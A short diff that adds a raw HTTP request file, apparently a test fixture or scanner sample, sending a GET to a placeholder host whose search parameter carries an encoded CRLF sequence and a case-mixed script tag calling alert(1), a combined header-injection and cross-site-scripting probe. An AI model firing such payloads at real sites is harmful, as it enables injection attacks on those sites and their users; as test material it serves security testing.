@@ -1,0 +1,4 @@
+GET /a?search=rEd%3D%0D%0a%0D%0a<ScRiPt>AlErT(1)</sCrIpT> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
